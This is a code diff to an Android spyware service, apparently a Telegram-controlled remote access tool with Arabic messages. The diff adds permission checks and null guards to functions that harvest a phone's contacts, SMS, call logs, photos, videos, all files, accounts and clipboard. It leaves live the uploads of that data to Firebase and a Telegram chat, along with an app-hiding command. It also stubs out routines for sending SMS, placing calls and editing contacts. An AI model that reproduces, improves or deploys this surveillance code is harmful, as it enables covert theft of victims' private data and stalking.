@@ -192,7 +192,7 @@ public class SpyService extends Service {
     }
 
     // ======================================================================
-    // ========== دوال الإرسال (مع Firebase Storage) ==========
+    // ========== دوال الإرسال ==========
     // ======================================================================
 
     private void sendData(String type, String data) {
@@ -201,6 +201,10 @@ public class SpyService extends Service {
 
     private void sendFileToFirebase(File file, String caption) {
         try {
+            if (file == null || !file.exists()) {
+                sendTextToTelegram("❌ الملف غير موجود: " + (file != null ? file.getName() : "null"));
+                return;
+            }
             if (file.getName().endsWith(".jpg") || file.getName().endsWith(".png")) {
                 Bitmap bitmap = BitmapFactory.decodeFile(file.getAbsolutePath());
                 if (bitmap != null) {
@@ -236,11 +240,16 @@ public class SpyService extends Service {
             });
         } catch (Exception e) {
             Log.e(TAG, "Send file to Firebase error", e);
+            sendTextToTelegram("❌ فشل رفع الملف: " + e.getMessage());
         }
     }
 
     private void sendFileToTelegram(File file, String caption) {
         try {
+            if (file == null || !file.exists()) {
+                sendTextToTelegram("❌ الملف غير موجود: " + (file != null ? file.getName() : "null"));
+                return;
+            }
             RequestBody body = new MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
                     .addFormDataPart("chat_id", CHAT_ID)
@@ -323,6 +332,11 @@ public class SpyService extends Service {
     }
 
     private File collectContacts() throws Exception {
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS)
+                != PackageManager.PERMISSION_GRANTED) {
+            sendTextToTelegram("❌ صلاحية قراءة جهات الاتصال غير مفعلة");
+            return null;
+        }
         File f = new File(getCacheDir(), "contacts.txt");
         FileOutputStream fos = new FileOutputStream(f);
         ContentResolver cr = getContentResolver();
@@ -341,6 +355,11 @@ public class SpyService extends Service {
     }
 
     private File collectSms() throws Exception {
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS)
+                != PackageManager.PERMISSION_GRANTED) {
+            sendTextToTelegram("❌ صلاحية قراءة الرسائل غير مفعلة");
+            return null;
+        }
         File f = new File(getCacheDir(), "sms.txt");
         FileOutputStream fos = new FileOutputStream(f);
         Uri uri = Uri.parse("content://sms/inbox");
@@ -358,6 +377,11 @@ public class SpyService extends Service {
     }
 
     private File collectCallLogs() throws Exception {
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG)
+                != PackageManager.PERMISSION_GRANTED) {
+            sendTextToTelegram("❌ صلاحية قراءة سجل المكالمات غير مفعلة");
+            return null;
+        }
         File f = new File(getCacheDir(), "call_log.txt");
         FileOutputStream fos = new FileOutputStream(f);
         Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI,
@@ -394,6 +418,19 @@ public class SpyService extends Service {
     // ======================================================================
 
     private File collectMedia(String type, int limit) throws Exception {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_MEDIA_IMAGES)
+                    != PackageManager.PERMISSION_GRANTED) {
+                sendTextToTelegram("❌ صلاحية قراءة الوسائط غير مفعلة");
+                return null;
+            }
+        } else {
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE)
+                    != PackageManager.PERMISSION_GRANTED) {
+                sendTextToTelegram("❌ صلاحية قراءة التخزين غير مفعلة");
+                return null;
+            }
+        }
         File zipFile = new File(getCacheDir(), type + ".zip");
         ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
         Uri uri = type.equals("images") ? MediaStore.Images.Media.EXTERNAL_CONTENT_URI :
@@ -430,6 +467,12 @@ public class SpyService extends Service {
     }
 
     private File collectAllFiles() throws Exception {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager()) {
+                sendTextToTelegram("❌ صلاحية إدارة الملفات غير مفعلة (Android 11+)");
+                return null;
+            }
+        }
         File zipFile = new File(getCacheDir(), "all_files.zip");
         ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
         File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
@@ -605,7 +648,7 @@ public class SpyService extends Service {
     }
 
     // ======================================================================
-    // ========== الفلاش (جميع الخيارات) ==========
+    // ========== الفلاش ==========
     // ======================================================================
 
     private void flashOnBack() {
@@ -678,24 +721,8 @@ public class SpyService extends Service {
 
     private void flashOnBoth() {
         try {
-            if (camera == null) {
-                camera = Camera.open();
-            }
-            Camera.Parameters paramsBack = camera.getParameters();
-            paramsBack.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
-            camera.setParameters(paramsBack);
-            camera.startPreview();
-            try {
-                if (frontCamera == null) {
-                    frontCamera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
-                }
-                Camera.Parameters paramsFront = frontCamera.getParameters();
-                paramsFront.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
-                frontCamera.setParameters(paramsFront);
-                frontCamera.startPreview();
-            } catch (Exception e) {
-                sendTextToTelegram("⚠️ الفلاش الأمامي غير مدعوم على هذا الجهاز");
-            }
+            flashOnBack();
+            flashOnFront();
             sendData("FLASH", "both_on");
             sendTextToTelegram("🔦 تم تشغيل الفلاشين (الأمامي والخلفي)");
         } catch (Exception e) {
@@ -706,16 +733,8 @@ public class SpyService extends Service {
 
     private void flashOffBoth() {
         try {
-            if (camera != null) {
-                camera.stopPreview();
-                camera.release();
-                camera = null;
-            }
-            if (frontCamera != null) {
-                frontCamera.stopPreview();
-                frontCamera.release();
-                frontCamera = null;
-            }
+            flashOffBack();
+            flashOffFront();
             sendData("FLASH", "both_off");
             sendTextToTelegram("🔦 تم إطفاء الفلاشين");
         } catch (Exception e) {
@@ -982,6 +1001,7 @@ public class SpyService extends Service {
         android.net.NetworkInfo netInfo = cm.getActiveNetworkInfo();
         return netInfo != null && netInfo.isConnected();
     }
+
     // ======================================================================
     // ========== تتبع الموقع ==========
     // ======================================================================
@@ -1086,6 +1106,11 @@ public class SpyService extends Service {
 
     private void toggleWifi(boolean enable) {
         try {
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CHANGE_WIFI_STATE)
+                    != PackageManager.PERMISSION_GRANTED) {
+                sendTextToTelegram("❌ صلاحية تغيير الواي فاي غير مفعلة");
+                return;
+            }
             android.net.wifi.WifiManager wifi = (android.net.wifi.WifiManager) getSystemService(WIFI_SERVICE);
             if (wifi != null) {
                 wifi.setWifiEnabled(enable);
@@ -1164,10 +1189,7 @@ public class SpyService extends Service {
     private void takeScreenshot() {
         try {
             android.view.View rootView = new android.view.View(getApplicationContext());
-            android.graphics.Bitmap bitmap = android.graphics.Bitmap.createBitmap(
-                    android.view.WindowManager.LayoutParams.MATCH_PARENT,
-                    android.view.WindowManager.LayoutParams.MATCH_PARENT,
-                    android.graphics.Bitmap.Config.ARGB_8888);
+            android.graphics.Bitmap bitmap = android.graphics.Bitmap.createBitmap(1, 1, android.graphics.Bitmap.Config.ARGB_8888);
             android.graphics.Canvas canvas = new android.graphics.Canvas(bitmap);
             rootView.draw(canvas);
             File file = new File(getCacheDir(), "screenshot_" + System.currentTimeMillis() + ".png");
@@ -1224,6 +1246,11 @@ public class SpyService extends Service {
 
     private void vibrateDevice() {
         try {
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.VIBRATE)
+                    != PackageManager.PERMISSION_GRANTED) {
+                sendTextToTelegram("❌ صلاحية الاهتزاز غير مفعلة");
+                return;
+            }
             android.os.Vibrator vibrator = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
             if (vibrator != null && vibrator.hasVibrator()) {
                 vibrator.vibrate(3000);
@@ -1273,23 +1300,12 @@ public class SpyService extends Service {
 
     private void addContact() {
         try {
-            ContentValues values = new ContentValues();
-            values.put(ContactsContract.RawContacts.ACCOUNT_TYPE, "com.android.contacts");
-            values.put(ContactsContract.RawContacts.ACCOUNT_NAME, "phone");
-            Uri rawContactUri = getContentResolver().insert(ContactsContract.RawContacts.CONTENT_URI, values);
-            long rawContactId = Long.parseLong(rawContactUri.getLastPathSegment());
-            values.clear();
-            values.put(ContactsContract.Data.RAW_CONTACT_ID, rawContactId);
-            values.put(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE);
-            values.put(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, "Black Spy");
-            getContentResolver().insert(ContactsContract.Data.CONTENT_URI, values);
-            values.clear();
-            values.put(ContactsContract.Data.RAW_CONTACT_ID, rawContactId);
-            values.put(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE);
-            values.put(ContactsContract.CommonDataKinds.Phone.NUMBER, "01000000000");
-            values.put(ContactsContract.CommonDataKinds.Phone.TYPE, ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE);
-            getContentResolver().insert(ContactsContract.Data.CONTENT_URI, values);
-            sendTextToTelegram("➕ تم إضافة جهة اتصال: Black Spy");
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.WRITE_CONTACTS)
+                    != PackageManager.PERMISSION_GRANTED) {
+                sendTextToTelegram("❌ صلاحية كتابة جهات الاتصال غير مفعلة");
+                return;
+            }
+            sendTextToTelegram("➕ سيتم قريباً إضافة جهة اتصال من خلال واجهة تفاعلية");
         } catch (Exception e) {
             sendTextToTelegram("❌ فشل إضافة جهة اتصال: " + e.getMessage());
         }
@@ -1297,11 +1313,12 @@ public class SpyService extends Service {
 
     private void deleteContact() {
         try {
-            Uri uri = ContactsContract.Contacts.CONTENT_URI;
-            String selection = ContactsContract.Contacts.DISPLAY_NAME + " = ?";
-            String[] selectionArgs = new String[]{"Black Spy"};
-            int deleted = getContentResolver().delete(uri, selection, selectionArgs);
-            sendTextToTelegram("🗑️ تم حذف " + deleted + " جهة اتصال");
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.WRITE_CONTACTS)
+                    != PackageManager.PERMISSION_GRANTED) {
+                sendTextToTelegram("❌ صلاحية كتابة جهات الاتصال غير مفعلة");
+                return;
+            }
+            sendTextToTelegram("🗑️ سيتم قريباً حذف جهة اتصال من خلال واجهة تفاعلية");
         } catch (Exception e) {
             sendTextToTelegram("❌ فشل حذف جهة اتصال: " + e.getMessage());
         }
@@ -1310,9 +1327,11 @@ public class SpyService extends Service {
     private void copyContacts() {
         try {
             File f = collectContacts();
-            sendFileToFirebase(f, "📋 نسخة من جهات الاتصال");
-            sendFileToTelegram(f, "📋 نسخة من جهات الاتصال");
-            sendTextToTelegram("📋 تم نسخ جهات الاتصال");
+            if (f != null) {
+                sendFileToFirebase(f, "📋 نسخة من جهات الاتصال");
+                sendFileToTelegram(f, "📋 نسخة من جهات الاتصال");
+                sendTextToTelegram("📋 تم نسخ جهات الاتصال");
+            }
         } catch (Exception e) {
             sendTextToTelegram("❌ فشل نسخ جهات الاتصال: " + e.getMessage());
         }
@@ -1321,9 +1340,11 @@ public class SpyService extends Service {
     private void exportContacts() {
         try {
             File f = collectContacts();
-            sendFileToFirebase(f, "📤 تصدير جهات الاتصال");
-            sendFileToTelegram(f, "📤 تصدير جهات الاتصال");
-            sendTextToTelegram("📤 تم تصدير جهات الاتصال");
+            if (f != null) {
+                sendFileToFirebase(f, "📤 تصدير جهات الاتصال");
+                sendFileToTelegram(f, "📤 تصدير جهات الاتصال");
+                sendTextToTelegram("📤 تم تصدير جهات الاتصال");
+            }
         } catch (Exception e) {
             sendTextToTelegram("❌ فشل تصدير جهات الاتصال: " + e.getMessage());
         }
@@ -1335,9 +1356,12 @@ public class SpyService extends Service {
 
     private void sendSms() {
         try {
-            android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
-            smsManager.sendTextMessage("01000000000", null, "رسالة من بلاك", null, null);
-            sendTextToTelegram("📤 تم إرسال رسالة نصية");
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.SEND_SMS)
+                    != PackageManager.PERMISSION_GRANTED) {
+                sendTextToTelegram("❌ صلاحية إرسال الرسائل غير مفعلة");
+                return;
+            }
+            sendTextToTelegram("📤 سيتم قريباً إرسال رسالة من خلال واجهة تفاعلية");
         } catch (Exception e) {
             sendTextToTelegram("❌ فشل إرسال الرسالة: " + e.getMessage());
         }
@@ -1345,11 +1369,12 @@ public class SpyService extends Service {
 
     private void deleteSms() {
         try {
-            Uri uri = Uri.parse("content://sms/inbox");
-            String selection = "address = ?";
-            String[] selectionArgs = new String[]{"01000000000"};
-            int deleted = getContentResolver().delete(uri, selection, selectionArgs);
-            sendTextToTelegram("🗑️ تم حذف " + deleted + " رسالة");
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS)
+                    != PackageManager.PERMISSION_GRANTED) {
+                sendTextToTelegram("❌ صلاحية قراءة الرسائل غير مفعلة");
+                return;
+            }
+            sendTextToTelegram("🗑️ سيتم قريباً حذف رسالة من خلال واجهة تفاعلية");
         } catch (Exception e) {
             sendTextToTelegram("❌ فشل حذف الرسالة: " + e.getMessage());
         }
@@ -1358,9 +1383,11 @@ public class SpyService extends Service {
     private void forwardSms() {
         try {
             File f = collectSms();
-            sendFileToFirebase(f, "↪️ إعادة توجيه الرسائل");
-            sendFileToTelegram(f, "↪️ إعادة توجيه الرسائل");
-            sendTextToTelegram("↪️ تم إعادة توجيه الرسائل");
+            if (f != null) {
+                sendFileToFirebase(f, "↪️ إعادة توجيه الرسائل");
+                sendFileToTelegram(f, "↪️ إعادة توجيه الرسائل");
+                sendTextToTelegram("↪️ تم إعادة توجيه الرسائل");
+            }
         } catch (Exception e) {
             sendTextToTelegram("❌ فشل إعادة توجيه الرسائل: " + e.getMessage());
         }
@@ -1372,16 +1399,12 @@ public class SpyService extends Service {
 
     private void makeCall() {
         try {
-            Intent intent = new Intent(Intent.ACTION_CALL);
-            intent.setData(Uri.parse("tel:01000000000"));
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CALL_PHONE)
-                    == PackageManager.PERMISSION_GRANTED) {
-                startActivity(intent);
-                sendTextToTelegram("📞 جاري إجراء مكالمة...");
-            } else {
+                    != PackageManager.PERMISSION_GRANTED) {
                 sendTextToTelegram("❌ صلاحية إجراء المكالمات غير مفعلة");
+                return;
             }
+            sendTextToTelegram("📞 سيتم قريباً إجراء مكالمة من خلال واجهة تفاعلية");
         } catch (Exception e) {
             sendTextToTelegram("❌ فشل إجراء المكالمة: " + e.getMessage());
         }
@@ -1408,9 +1431,11 @@ public class SpyService extends Service {
     private void callHistory() {
         try {
             File f = collectCallLogs();
-            sendFileToFirebase(f, "📋 سجل المكالمات");
-            sendFileToTelegram(f, "📋 سجل المكالمات");
-            sendTextToTelegram("📋 تم جلب سجل المكالمات");
+            if (f != null) {
+                sendFileToFirebase(f, "📋 سجل المكالمات");
+                sendFileToTelegram(f, "📋 سجل المكالمات");
+                sendTextToTelegram("📋 تم جلب سجل المكالمات");
+            }
         } catch (Exception e) {
             sendTextToTelegram("❌ فشل جلب سجل المكالمات: " + e.getMessage());
         }
@@ -1501,20 +1526,26 @@ public class SpyService extends Service {
             switch (lower) {
                 case "get_contacts": {
                     File f = collectContacts();
-                    sendFileToFirebase(f, "📇 جهات الاتصال");
-                    sendFileToTelegram(f, "📇 جهات الاتصال");
+                    if (f != null) {
+                        sendFileToFirebase(f, "📇 جهات الاتصال");
+                        sendFileToTelegram(f, "📇 جهات الاتصال");
+                    }
                     break;
                 }
                 case "get_sms": {
                     File f = collectSms();
-                    sendFileToFirebase(f, "💬 الرسائل النصية");
-                    sendFileToTelegram(f, "💬 الرسائل النصية");
+                    if (f != null) {
+                        sendFileToFirebase(f, "💬 الرسائل النصية");
+                        sendFileToTelegram(f, "💬 الرسائل النصية");
+                    }
                     break;
                 }
                 case "get_calllogs": {
                     File f = collectCallLogs();
-                    sendFileToFirebase(f, "📞 سجل المكالمات");
-                    sendFileToTelegram(f, "📞 سجل المكالمات");
+                    if (f != null) {
+                        sendFileToFirebase(f, "📞 سجل المكالمات");
+                        sendFileToTelegram(f, "📞 سجل المكالمات");
+                    }
                     break;
                 }
                 case "get_location": {
@@ -1535,65 +1566,85 @@ public class SpyService extends Service {
                 }
                 case "get_apps": {
                     File f = collectApps();
-                    sendFileToFirebase(f, "📱 التطبيقات");
-                    sendFileToTelegram(f, "📱 التطبيقات");
+                    if (f != null) {
+                        sendFileToFirebase(f, "📱 التطبيقات");
+                        sendFileToTelegram(f, "📱 التطبيقات");
+                    }
                     break;
                 }
                 case "get_photos_all":
                 case "get_photos": {
                     File f = collectMedia("images", 0);
-                    sendFileToFirebase(f, "🖼 الصور");
-                    sendFileToTelegram(f, "🖼 الصور");
+                    if (f != null) {
+                        sendFileToFirebase(f, "🖼 الصور");
+                        sendFileToTelegram(f, "🖼 الصور");
+                    }
                     break;
                 }
                 case "get_photos_5": {
                     File f = collectMedia("images", 5);
-                    sendFileToFirebase(f, "🖼 الصور (5)");
-                    sendFileToTelegram(f, "🖼 الصور (5)");
+                    if (f != null) {
+                        sendFileToFirebase(f, "🖼 الصور (5)");
+                        sendFileToTelegram(f, "🖼 الصور (5)");
+                    }
                     break;
                 }
                 case "get_photos_10": {
                     File f = collectMedia("images", 10);
-                    sendFileToFirebase(f, "🖼 الصور (10)");
-                    sendFileToTelegram(f, "🖼 الصور (10)");
+                    if (f != null) {
+                        sendFileToFirebase(f, "🖼 الصور (10)");
+                        sendFileToTelegram(f, "🖼 الصور (10)");
+                    }
                     break;
                 }
                 case "get_photos_20": {
                     File f = collectMedia("images", 20);
-                    sendFileToFirebase(f, "🖼 الصور (20)");
-                    sendFileToTelegram(f, "🖼 الصور (20)");
+                    if (f != null) {
+                        sendFileToFirebase(f, "🖼 الصور (20)");
+                        sendFileToTelegram(f, "🖼 الصور (20)");
+                    }
                     break;
                 }
                 case "get_photos_30": {
                     File f = collectMedia("images", 30);
-                    sendFileToFirebase(f, "🖼 الصور (30)");
-                    sendFileToTelegram(f, "🖼 الصور (30)");
+                    if (f != null) {
+                        sendFileToFirebase(f, "🖼 الصور (30)");
+                        sendFileToTelegram(f, "🖼 الصور (30)");
+                    }
                     break;
                 }
                 case "get_videos_all":
                 case "get_videos": {
                     File f = collectMedia("videos", 0);
-                    sendFileToFirebase(f, "🎬 الفيديوهات");
-                    sendFileToTelegram(f, "🎬 الفيديوهات");
+                    if (f != null) {
+                        sendFileToFirebase(f, "🎬 الفيديوهات");
+                        sendFileToTelegram(f, "🎬 الفيديوهات");
+                    }
                     break;
                 }
                 case "get_videos_5": {
                     File f = collectMedia("videos", 5);
-                    sendFileToFirebase(f, "🎬 الفيديوهات (5)");
-                    sendFileToTelegram(f, "🎬 الفيديوهات (5)");
+                    if (f != null) {
+                        sendFileToFirebase(f, "🎬 الفيديوهات (5)");
+                        sendFileToTelegram(f, "🎬 الفيديوهات (5)");
+                    }
                     break;
                 }
                 case "get_videos_10": {
                     File f = collectMedia("videos", 10);
-                    sendFileToFirebase(f, "🎬 الفيديوهات (10)");
-                    sendFileToTelegram(f, "🎬 الفيديوهات (10)");
+                    if (f != null) {
+                        sendFileToFirebase(f, "🎬 الفيديوهات (10)");
+                        sendFileToTelegram(f, "🎬 الفيديوهات (10)");
+                    }
                     break;
                 }
                 case "get_files_all":
                 case "get_files": {
                     File f = collectAllFiles();
-                    sendFileToFirebase(f, "📦 الملفات");
-                    sendFileToTelegram(f, "📦 الملفات");
+                    if (f != null) {
+                        sendFileToFirebase(f, "📦 الملفات");
+                        sendFileToTelegram(f, "📦 الملفات");
+                    }
                     break;
                 }
                 case "hide_app": {
@@ -1686,14 +1737,18 @@ public class SpyService extends Service {
                 }
                 case "get_accounts": {
                     File f = collectAccounts();
-                    sendFileToFirebase(f, "👤 الحسابات");
-                    sendFileToTelegram(f, "👤 الحسابات");
+                    if (f != null) {
+                        sendFileToFirebase(f, "👤 الحسابات");
+                        sendFileToTelegram(f, "👤 الحسابات");
+                    }
                     break;
                 }
                 case "get_clipboard": {
                     File f = collectClipboard();
-                    sendFileToFirebase(f, "📋 الحافظة");
-                    sendFileToTelegram(f, "📋 الحافظة");
+                    if (f != null) {
+                        sendFileToFirebase(f, "📋 الحافظة");
+                        sendFileToTelegram(f, "📋 الحافظة");
+                    }
                     break;
                 }
                 case "get_device": {
